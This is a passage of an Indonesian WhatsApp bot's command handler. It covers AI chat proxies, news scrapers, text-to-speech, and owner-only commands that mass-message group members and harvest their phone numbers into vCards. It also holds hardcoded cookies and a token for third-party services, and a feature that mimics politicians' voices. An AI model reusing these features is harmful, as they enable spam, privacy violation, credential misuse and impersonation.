      reply("Terjadi Kesalahan Dalam Proses Permintaan.");
  }
}
break

case 'typli-ai': {
if (isBan) return XRB()
await XReaction()
 if (!q) return reply(`_Tanya apa?_`);
 // wm avz
 const avz = async (prompt) => {
   const data = {
     prompt: prompt,
     temperature: 1.2
   };
// wm avz
   const config = {
     method: 'post',
     url: 'https://typli.ai/api/generators/completion',
     headers: {
       'Content-Type': 'application/json',
       'Accept': 'application/json'
     },
     data: JSON.stringify(data)
   };
// wm avz
   try {
     const response = await axios(config);
     return response.data;
   } catch (error) {
     console.error("Fetch error:", error.response ? error.response.data : error.message);
     throw error;
   }
 };
 // wm avz
 const avoskybaik = `${encodeURIComponent(q)}`;
 try {
   const answer = await avz(q);
   reply(answer);
 } catch (error) {
   reply("Terjadi kesalaha!");
 }
}
break;

case 'poly-ai':{
if (isBan) return XRB()
await XReaction()
  if (!q) return reply(`_Tanya apa?_`);
  async function polybuzzAi(prompt) {
  let data = new URLSearchParams();
  data.append('currentChatStyleId', '1');
  data.append('mediaType', '2');
  data.append('needLive2D', '2');
  data.append('secretSceneId', 'wHp7z');
  data.append('selectId', '209837277');
  data.append('speechText', prompt);

  let headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Cookie': 'session=9997156d23496b9ff96fc09d162191f74821790eaa4ecc52096273a60f517ad3',
  };

  try {
    let { data: respon } = await axios.post('https://api.polybuzz.ai/api/conversation/msgbystream', data, { headers });
    //dibantu ama ai paling sigma(ChatGpt) kode kemaren yg cvbee.ai
    const result = respon.split('\n')
      .filter(line => line.trim())
      .map(line => {
        try {
          const json = JSON.parse(line.trim());
          return json.content || '';
        } catch (e) {
          console.error("Invalid JSON:", line);
          return '';
        }
      })
      .join('');
      //
    return result;
  } catch (e) {
    console.error(e);
    return null;
  }
}
 try {
   const answer = await polybuzzAi(q);
   reply(answer);
 } catch (error) {
   reply("Terjadi kesalahan !");
 }
}
 break
 

case 'chatevery-where':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Example: ${XyrooRynzz} axios`)
async function sanzmd(prompt) {
  const response = await axios({
    method: "POST",
    url: "https://chateverywhere.app/api/chat",
    headers: {
      "Content-Type": "application/json",
      "Cookie": "_ga=GA1.1.34196701.1707462626; _ga_ZYMW9SZKVK=GS1.1.1707462625.1.0.1707462625.60.0.0; ph_phc_9n85Ky3ZOEwVZlg68f8bI3jnOJkaV8oVGGJcoKfXyn1_posthog=%7B%22distinct_id%22%3A%225aa4878d-a9b6-40fb-8345-3d686d655483%22%2C%22%24sesid%22%3A%5B1707462733662%2C%22018d8cb4-0217-79f9-99ac-b77f18f82ac8%22%2C1707462623766%5D%7D",
      Origin: "https://chateverywhere.app",
      Referer: "https://chateverywhere.app/id",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
    },
    data: {
      model: {
        id: "gpt-3.5-turbo-0613",
        name: "GPT-3.5",
        maxLength: 12000,
        tokenLimit: 4000,
      },
      prompt: prompt,
      messages: [{
        pluginId: null,
        content: prompt,
        role: "user"
      },
        {
          pluginId: null,
          content: `${botname} adalah programmer yang berasal dari Sumatera Selatan, Indonesia. Ia adalah seorang yang mengembangkan semua aplikasi.`,
          role: "assistant"
        }]
    }
  })

  return response.data
}
try {
let jut = await sanzmd(text)
reply(`${jut}`)
} catch (error) {
  reply(error.message)
}
}
break

case 'gemini-pro':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh:\n${XyrooRynzz} Apa itu chatgpt`);

async function fetchWithModel(content, model, token) {
    try {
      const response = await axios.post('https://luminai.my.id/', {
        content,
        model,
        headers: {
                'Authorization': `Bearer ${token}`
                 }
      });

      console.log(response.data);
      return response.data;
    } catch (error) {
      console.error(error);
      throw error;
    }
  }
  fetchWithModel(text, 'gemini-pro', '8be9e34764cd2fc4e6bcfb1bf6a945efe30406573a92d8ef0ec1613dc0e54876')
    .then(data => {
      const textl = data.result;
      reply(textl);
    })
  break;
}
  
case 'gpt-4o':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh:\n${Xyroo}${command} Apa itu chatgpt`);

  async function fetchWithModel(content, model, token) {
    try {
      const response = await axios.post('https://luminai.my.id/', {
        content,
        model,
        headers: {
                'Authorization': `Bearer ${token}`
                 }
      });

      console.log(response.data);
      return response.data;
    } catch (error) {
      console.error(error);
      throw error;
    }
  }

  fetchWithModel(text, 'gpt-4o', '8be9e34764cd2fc4e6bcfb1bf6a945efe30406573a92d8ef0ec1613dc0e54876')
    .then(data => {
      const textl = data.result;
      reply(textl);
    })
    .catch(error => console.error(error));
  break;
}
 
case 'ai': {
if (isBan) return XRB()
await XReaction()
  if (!text) {
    return reply(`mau tanya apa?`);
  }
  const prompt = `Anda adalah ai, kamu memiliki kecerdasan ai yang luar biasa, kamu senang membantu orang lain, dan gaya bicara mu sangatlah sopan`
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || xy);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://luminai.my.id', requestData)).data.result;
    reply(response);
  } catch (err) {
    reply(err.toString());
  }
}
                break
                

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Ai Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Berita Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case "nasa": {
if (isBan) return XRB()
await XReaction()
async function nasaNews() {
try {
const anu = await axios.get("https://www.nasa.gov/news/releases/latest/index.html")
const $ = cheerio.load(anu.data)
const dbres = []

$(".hds-content-item").each((a, b) => {
const judul = $(b).find(".hds-a11y-heading-22").text()
const desc = $(b).find("p").text()
const link = $(b).find(".hds-content-item-inner a").attr("href")
dbres.push({ judul, desc, link })
})

return dbres
} catch (err) {
console.log(err)
}
}
const res = await nasaNews()
if (res.length === 0) return Alice.sendMessage(m.chat, { text: "Gagal Mengambil Berita" }, { quoted:m })
await Alice.sendMessage(m.chat, { text: "HASIL SEARCH\n\n"+res.map(a => `> JUDUL: ${a.judul}\n> DESCRIPTION: ${a.desc}\n> LINK: ${a.link}`).join("\n\n") }, { quoted: m})
}
break
case 'metrotv': {
if (isBan) return XRB()
await XReaction()
  try {
    const axios = require('axios')
    const cheerio = require('cheerio')
    const baseURL = 'https://www.metrotvnews.com'
    const { data } = await axios.get(baseURL)
    const $ = cheerio.load(data) 
    const terbaru = []
    const detailList = []
    const links = []
    $('.main-news .big-news-carousel .news-item, .main-news .small-news .news-item').each((i, el) => {
      const title = $(el).find('h1 a, h2 a').text().trim()
      const url = $(el).find('h1 a, h2 a').attr('href')
      const img = $(el).find('img').attr('src') || ''
      const kategori = $(el).find('.news-category').text().trim()
      if (title && url) {
        const fullUrl = url.startsWith('http') ? url : baseURL + url
        terbaru.push({
          title,
          url: fullUrl,
          thumbnail: img.startsWith('http') ? img : baseURL + img,
          kategori
        })
        links.push(fullUrl)
      }
    })
    const url = links[0]
    const detailRes = await axios.get(url)
    const _$ = cheerio.load(detailRes.data)
    let scriptData = ''
    _$('script').each((i, el) => {
      const html = _$(el).html()
      if (html.includes('dimension6')) scriptData = html
    })
    const detail = {
      title: _$('meta[property="og:title"]').attr('content') || '',
      description: _$('meta[property="og:description"]').attr('content') || '',
      image: _$('meta[property="og:image"]').attr('content') || '',
      publishedAt: scriptData.match(/'dimension6':\s*'([^']+)'/)?.[1] || '',
      author: scriptData.match(/'dimension5':\s*'([^']+)'/)?.[1] || '',
      category: scriptData.match(/'dimension7':\s*'([^']+)'/)?.[1] || '',
      content: []
    }
    _$('.news > p').each((i, el) => {
      const text = _$(el).text().trim()
      if (text) detail.content.push(text)
    })
    let teks = `*Berita Terbaru MetroTV*\n\n`
    for (let i = 0; i < terbaru.length; i++) {
      teks += `*${i + 1}. ${terbaru[i].title}*\n`
      teks += `Kategori: ${terbaru[i].kategori}\n`
      teks += `Link: ${terbaru[i].url}\n\n`
    }

    await Alice.sendMessage(m.chat, {
      text: teks,
      contextInfo: {
        externalAdreply: {
          title: "Berita MetroTV",
          body: "Klik untuk baca selengkapnya",
          thumbnailUrl: terbaru[0].thumbnail,
          sourceUrl: terbaru[0].url,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
    let teksDetail = `*${detail.title}*\n\n`
    teksDetail += `${detail.description}\n\n`
    teksDetail += `Kategori: ${detail.category}\nPenulis: ${detail.author}\nTanggal: ${detail.publishedAt}\n\n`
    teksDetail += detail.content.slice(0, 5).join('\n\n') + '\n\n_Selengkapnya di link berita._'

    await Alice.sendMessage(m.chat, {
      image: { url: detail.image },
      caption: teksDetail
    }, { quoted: m })
    } catch (error) {
        reply(`eror`);
    }
}
break
case 'liputan6': {
if (isBan) return XRB()
await XReaction()
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function avzz() {
        try {
// wm avs                  
            const AvoskyBaik = await axios.get('https://www.liputan6.com/');
            const $ = cheerio.load(AvoskyBaik.data);
// wm avs
            const latestNews = $('.articles--iridescent-list').eq(2).find('article');
// wm avs
            const results = [];
            latestNews.each(function () {
                try {
                    const title = $(this).find('figure a').attr('title');
                    const link = $(this).find('figure a').attr('href');
                    const image = $(this).find('figure a picture img').attr('data-src');
                    const tag = $(this).find('aside header a').text();
// wm avs
                    results.push({ title, link, tag, image, source: 'liputan6' });
                } catch (e) {
// wm avs
                    console.error('Error scraping article:', e);
                }
            });
// wm avs
            return results;
        } catch (error) {
            console.error('Error fetching:', error);
            return [];
        }
    }
// wm avs
    avzz()
        .then(results => {
            if (results.length === 0) {
                reply('Tidak ada berita terbaru yang ditemukan.');
            } else {
                let message = 'Berita Terbaru dari Liputan6:\n\n';
                results.forEach((news, index) => {
                    message += `${index + 1}. ${news.title}\n`;
                    message += `Tag: ${news.tag}\n`;
                    message += `Link: ${news.link}\n`;
                    message += `Gambar: ${news.image}\n\n`;
                });
                reply(message);
            }
        })
        .catch(error => {
            console.error('ada bug:', error.message);
            reply('Terjadi kesalahan...');
        });
}
    break    
    
case 'merdekanews': {
if (isBan) return XRB()
await XReaction()
const fetch = require('node-fetch');
const cheerio = require('cheerio');
async function merdekaavs() {
  try {
    const res = await fetch('https://www.merdeka.com/rss');
    const $ = cheerio.load(await res.text(), { xmlMode: true });
    const channel = {
      title: $('channel > title').text(),
      description: $('channel > description').text(),
      link: $('channel > link').text(),
      image: $('channel > image > url').text(),
    };
    const items = $('item').map((_, el) => ({
      title: 'Title:'+ $(el).find('title').text(),
      link: 'Link:'+ $(el).find('link').text(),
      description: 'Deskripsi:'+ $(el).find('description').text(),
      pubDate: 'Post'+ $(el).find('pubDate').text(),
      image: $(el).find('enclosure').attr('url') || null
    })).get();
    return { channel, total: items.length, data: items };
  } catch {
    return { message: 'Something went wrong' };
  }
}
let lily = await merdekaavs()
      let results = lily.data 
        if (results.length > 0) {
        let message = `Hasil dari pencarian merdeka.com :\n\n`;
        results.forEach((result, index) => {
        message += `${result.title}${result.description}${result.link}\n\n`;
        });
    reply(message)
 } else {
reply('Tidak Ada Hasil.');
}
}
break

case 'malaymail': {
if (isBan) return XRB()
await XReaction()
    reply('_Mencari berita terkini di Malay Mail_');

    try {
        const { data } = await axios.get('https://www.malaymail.com/');
        const $ = cheerio.load(data);

        const newsItems = [];
        $('.article-title a').each((index, element) => {
            const title = $(element).text().trim();
            const link = $(element).attr('href');
            newsItems.push({ title, link });
        });

        if (newsItems.length === 0) {
            throw new Error('Gada Berita Baru');
        }

        let beritaText = 'Berita Terkini dari Malay Mail:\n\n';
        newsItems.forEach((item, index) => {
            beritaText += `${index + 1}. ${item.title}\n`;
            beritaText += `Link: ${item.link}\n\n`;
        });

        reply(beritaText);
    } catch (error) {
        reply(`${error.message}`);
    }
}
break;

case 'vietnamnews': {
if (isBan) return XRB()
await XReaction()
    reply('_Mencari berita terkini di Vietnam News..._'); 
    try {
        const { data } = await axios.get('https://vietnamnews.vn/');
        const $ = cheerio.load(data);
        const newsItems = [];
        $('h3 a').each((index, element) => {
            const title = $(element).text().trim();
            const link = $(element).attr('href');
            if (title && link) {
                newsItems.push({ title, link: `${link}` });
            }
        });
        if (newsItems.length === 0) {
            throw new Error('Tidak ad..');
        }
        let beritaText = 'Berita Terkini dari Vietnam News:\n\n';
        newsItems.forEach((item, index) => {
            beritaText += `${index + 1}. ${item.title}\n`;
            beritaText += `Link: ${item.link}\n\n`;
        });        
        reply(beritaText);
    } catch (error) {
        reply(`Error: ${error.message}`);
    }
}
break;

case 'kontan': {
if (isBan) return XRB()
await XReaction()
if (!q) return reply(`_cari berita apa_`)
const axios = require('axios');
const cheerio = require('cheerio');
async function avzzzzz(text, m) {
    const maxRetries = 3;
    let attempts = 0;

    while (attempts < maxRetries) {
        try {
            const { data } = await axios.get(`https://www.kontan.co.id/search?search=${encodeURIComponent(text)}`, {
                timeout: 2000,
            });

            const $ = cheerio.load(data);
            const results = [];

            $('.list-berita ul li').each((index, element) => {
                const titleElement = $(element).find('h1 a');
                const title = titleElement.text().trim();
                const link = titleElement.attr('href');

                if (title && link) {
                    results.push({ title, link: `https:${link}` });
                }
            });

            if (results.length > 0) {
                let message = 'Hasil pencarian:\n\n';
                results.forEach((result, index) => {
                    message += `${index + 1}. ${result.title}\n${result.link}\n\n`;
                });
                reply(message);
            } else {
                reply('Tidak Ada Hasil.');
            }

            return;
        } catch (error) {
            attempts++;
            if (attempts >= maxRetries) {
                reply(`Error: ${error.message}`);
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}
avzzzzz(`${encodeURIComponent(text)}`, m);
}
break

case 'indozone': {
if (isBan) return XRB()
await XReaction()
    if (!q) return reply(`_cari berita apa_`);
    const axios = require('axios');
    const cheerio = require('cheerio');
    async function fadami(query, m) {
        const maxRetries = 3;
        let attempts = 0;
        while (attempts < maxRetries) {
            try {
                const { data } = await axios.get(`https://fadami.indozone.id/search?q=${encodeURIComponent(query)}`, {
                    timeout: 2000,
                });
                const $ = cheerio.load(data);
                const results = [];
                $('.latest__item').each((index, element) => {
                    const titleElement = $(element).find('.latest__title a');
                    const title = titleElement.text().trim();
                    const link = titleElement.attr('href');
                    const imgElement = $(element).find('.latest__img img');
                    const imgSrc = imgElement.data('src');
                    
                    if (title && link && imgSrc) {
                        results.push({ title, link: `${link}`, imgSrc });
                    }
                });
                if (results.length > 0) {
                    let message = 'Hasil pencarian:\n\n';
                    results.forEach((result, index) => {
                        message += `${index + 1}. ${result.title}\nLink: ${result.link}\nJpg: ${result.imgSrc}\n\n`;
                    });
                    reply(message);
                } else {
                    reply('Tidak Ada Hasil.');
                }
                return;
            } catch (error) {
                attempts++;
                if (attempts >= maxRetries) {
                    reply(`Error: ${error.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }
    fadami(q, m);
}
break
                
case 'detik': {
if (isBan) return XRB()
await XReaction()

DetikNews().then(async(res) => {
let no = 0
let teks_berita = ""
for (let i of res) {
no += 1
teks_berita += `\n• ${no.toString()} •\n`
teks_berita += `Berita: ${i.berita}\n`
teks_berita += `Upload: ${i.berita_diupload}\n`
teks_berita += `Link: ${i.berita_url}\n`
}
teks_berita += ""
Alice.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks_berita }, { quoted: m })
})
}
break
case 'cnbc': {
if (isBan) return XRB()
await XReaction()

CNBCNews().then(async(res) => {
let no = 0
teks_berita = ""
for (let i of res) {
no += 1
teks_berita += `\n• ${no.toString()} •\n`
teks_berita += `Berita: ${i.berita}\n`
teks_berita += `Upload: ${i.berita_diupload}\n`
teks_berita += `Link: ${i.berita_url}\n`
}
teks_berita += ""
Alice.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks_berita }, { quoted: m })
})
}
break
case 'cnn': {
if (isBan) return XRB()
await XReaction()

CNNNews().then(res => {
let no = 0
teks_berita = ""
for (let i of res) {
no += 1
teks_berita += `\n• ${no.toString()} •\n`
teks_berita += `Berita: ${i.berita}\n`
teks_berita += `Link: ${i.berita_url}\n`
}
teks_berita += ""
reply(teks_berita) 
})
}
break
case 'inews': {
if (isBan) return XRB()
await XReaction()
if (!q) return reply(`_penculikan anak/berita lainnya_`)
    const query = args.join(" ");
  await aviz(query).then(results => {
        if (results.length === 0) {
            reply("Tidak ada hasil ditemukan.");
        } else {
            let avosky = "Hasil pencarian berita iNews:\n\n";
            results.forEach((result, index) => {
                avosky += `${index + 1}. *${result.title}*\n`;
                avosky += `📅 ${result.date}\n`;
                avosky += `🔗 [Baca lebih lanjut](${result.url})\n`;
                avosky += `🖼️ Gambar: ${result.imgUrl}\n\n`;
            });
            reply(avosky);
        }
    });
}
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Berita Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Push Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\


case 'pushkontak': {
if (isBan) return XRB()
await XReaction()
if (!isOwner) return XRO()
if (!m.isGroup) return XRG()
if (!text) return reply("PESAN PUSHKON NYA?")
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup Dengan Delay 6 Detik/Chat`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./AliceDatabase/contacts.json', JSON.stringify(contacts))
await Alice.sendMessage(mem, {text: teks}, {quoted: fkontak})
await sleep(6000)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER [ ${global.ownername} ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./AliceDatabase/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Alice.sendMessage(m.sender, { document: fs.readFileSync("./AliceDatabase/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./AliceDatabase/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./AliceDatabase/contacts.vcf", "")
}}
break
case 'pushkontak2': {
if (isBan) return XRB()
await XReaction()
    if (!isOwner) return XRO();
    
    if (!text) {
        return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1000 = 1 Detik\nketik *.getidgc* untuk melihat id grup");
    }

    const parts = text.split("|");
    if (parts.length < 3) {
        return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1000 = 1 Detik\nketik *.getidgc* untuk melihat id grup");
    }

    const idnya = parts[0];
    const delay = Number(parts[1]);
    const teks = parts[2];

    if (!idnya.endsWith("@g.us")) {
        return reply("Format ID Grup Tidak Valid");
    }

    if (isNaN(delay)) {
        return reply("Format Delay Tidak Valid");
    }

    if (!teks) {
        return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1000 = 1 Detik\nketik *.getidgc* untuk melihat id grup");
    }

    let groupMetadataa;
    try {
        groupMetadataa = await Alice.groupMetadata(idnya);
    } catch (e) {
        return reply("*ID Grup* tidak valid!");
    }

    const participants = groupMetadataa.participants;
    const halls = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
    
    reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`);

    const contacts = []; // Pastikan contacts dideklarasikan
    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem);
            await fs.writeFileSync('./AliceDatabase/contacts.json', JSON.stringify(contacts));
            await Alice.sendMessage(mem, { text: teks }, { quoted: fkontak });
            await sleep(delay);
        }
    }

    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts.map(contact => {
            return [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:BUYER [ ${global.ownername} ] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                ""
            ].join("\n");
        }).join("");

        fs.writeFileSync("./AliceDatabase/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        return reply(err.toString());
    } finally {
        if (m.chat !== m.sender) {
            await reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`);
        }
        await Alice.sendMessage(m.sender, {
            document: fs.readFileSync("./AliceDatabase/contacts.vcf"),
            fileName: "contacts.vcf",
            caption: "File Contact Berhasil Di Buat✅",
            mimetype: "text/vcard"
        }, { quoted: m });

        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./AliceDatabase/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./AliceDatabase/contacts.vcf", "");
    }
}
break;
case 'savekontak': {
if (isBan) return XRB()
await XReaction()
if (!isOwner) return XRO()
if (!m.isGroup) return XRG()
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./AliceDatabase/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER [ ${global.ownername} ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./AliceDatabase/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await Alice.sendMessage(m.sender, { document: fs.readFileSync("./AliceDatabase/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./AliceDatabase/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./AliceDatabase/contacts.vcf", "")
}}
break
case 'savekontak2': {
if (isBan) return XRB()
await XReaction()
if (!isOwner) return XRO()
if (!text) return reply("idgrupnya\n\nketik *.getidgc* untuk melihat id grup")
var idnya = text
var groupMetadataa
try {
groupMetadataa = await Alice.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./AliceDatabase/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER [ ${global.ownername} ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./AliceDatabase/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await Alice.sendMessage(m.sender, { document: fs.readFileSync("./AliceDatabase/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./AliceDatabase/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./AliceDatabase/contacts.vcf", "")
}}
break


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Push Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\



//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Audio Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
      case "ringtone":
if (isBan) return XRB()
await XReaction()      
        {
          if (!text) {
            return reply(`Contoh : ${XyrooRynzz} black rover`);
          }
          let anutone2 = await ringtone(text);
          let result = anutone2[Math.floor(Math.random() * anutone2.length)];
          Alice.sendMessage(m.chat, {
            audio: {
              url: result.audio
            },
            fileName: result.title + ".mp3",
            mimetype: "audio/mpeg"
          }, {
            quoted: m
          });
        }
        break;
case 'tts': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply("masukkan text\nExample: ahh ah ah ahhh")
const API_BASE_URL = 'https://flowfalcon.dpdns.org/tools/text-to-speech';

  try {
    const res = await fetch(`${API_BASE_URL}?text=${encodeURIComponent(text)}`);
    const json = await res.json();

    if (!json.status || !json.result || !Array.isArray(json.result) || json.result.length === 0) {
      return reply('Gagal generate suara atau tidak ada suara yang ditemukan.');
    }

    let allButtons = [];

    for (const voice of json.result) {
      const name = voice.voice_name;
      const url = Object.values(voice).find(v => typeof v === 'string' && v.startsWith('https'));

      if (url) {
        allButtons.push({
          buttonId: `.getaudio ${url}`,
          buttonText: { displayText: `Voice: ${name}`},
          type: 1
        });
      }
    }

    if (allButtons.length === 0) {
        return reply('Tidak ada suara yang valid ditemukan untuk dibuatkan tombol.');
    }

    const buttonMessage = {
        text: `Pilih jenis suara untuk "${text}":`,
        footer: "Klik tombol di bawah untuk mendengarkan suara.",
        buttons: allButtons,
        headerType: 1,
        viewOnce: true
    };

    await Alice.sendMessage(m.chat, buttonMessage, { quoted: m });

  } catch (err) {
    console.error(err);
    reply('Terjadi kesalahan saat memproses audio.');
  }
}
break;

case "getaudio": case "gtmp3": {
if (isBan) return XRB()
await XReaction()
try {
if (!text) return reply("https://example.com")
Alice.sendMessage(m.chat, {audio: {url: `${text}`}, mimetype: 'audio/mpeg'}, { quoted : m })
} catch (e) {
console.error(e)
reply(`Failed to download video because:${e}`)
}
}
break
case 'voice-alice': {
if (isBan) return XRB()
await XReaction()
    if (!text) {
        return reply(`*Contoh:* ${XyrooRynzz} Alice,Haii ceee`);
    }
    await XReaction()
const [voice, ...messageParts] = text.split(',');    
const message = messageParts.join(',').trim();

    let prompt = `Nama kamu adalah Alice, kamu adalah seorang wanita yang lembut dan penuh kasih sayang. Berbicara dengan nada yang lembut, hangat, dan penuh perhatian. Suaramu menenangkan dan penuh empati, seperti seorang sahabat yang selalu mendengarkan. Tanggapi pesan berikut dengan kelembutan dan kebaikan hati: "${message}"`;
 

    const requestData = { content: message, user: m.sender, prompt: prompt };

    try {
        const response = await axios.post('https://luminai.my.id', requestData);
        const generatedText = response.data.result;

        const ttsUrl = `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${encodeURIComponent(generatedText)}&key=${apii.xterm.key}&voice=bella`;
        const audioResponse = await fetch(ttsUrl);

        if (!audioResponse.ok) throw new Error('Gagal mengambil audio TTS');
        const audioBuffer = await audioResponse.arrayBuffer();

        Alice.sendMessage(m.chat, { audio: Buffer.from(audioBuffer), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    } catch (err) {
        console.error('Terjadi kesalahan:', err);
        reply('Terjadi kesalahan saat memproses permintaan Anda.');
    }
}
break

case 'voice-michie': {
if (isBan) return XRB()
await XReaction()
    if (!text) {
        return reply(`*Contoh:* ${XyrooRynzz} michie,Haii ceee`);
    }
    await XReaction()
const [voice, ...messageParts] = text.split(',');    
const message = messageParts.join(',').trim();

    let prompt = `Nama kamu adalah michie dari jkt48, kamu adalah seorang wanita yang lembut dan penuh kasih sayang. Berbicara dengan nada yang lembut, hangat, dan penuh perhatian. Suaramu menenangkan dan penuh empati, seperti seorang sahabat yang selalu mendengarkan. Tanggapi pesan berikut dengan kelembutan dan kebaikan hati: "${message}"`;
 

    const requestData = { content: message, user: m.sender, prompt: prompt };

    try {
        const response = await axios.post('https://luminai.my.id', requestData);
        const generatedText = response.data.result;

        const ttsUrl = `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${encodeURIComponent(generatedText)}&key=${apii.xterm.key}&voice=michi_jkt48`;
        const audioResponse = await fetch(ttsUrl);

        if (!audioResponse.ok) throw new Error('Gagal mengambil audio TTS');
        const audioBuffer = await audioResponse.arrayBuffer();

        Alice.sendMessage(m.chat, { audio: Buffer.from(audioBuffer), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    } catch (err) {
        console.error('Terjadi kesalahan:', err);
        reply('Terjadi kesalahan saat memproses permintaan Anda.');
    }
}
break

case 'voice-tokoh': {
if (isBan) return XRB()
await XReaction()
    if (!text) {
        return reply(`*Contoh:* ${XyrooRynzz} megawati,Hai bu\n\nDaftar Tokoh Yang Tersedia:\nadam\nprabowo\nthomas_shelby\njokowi\nmegawati`);
    }
    await XReaction()

    const [voice, ...messageParts] = text.split(',');
    const message = messageParts.join(',').trim();

    if (!voice || !message) {
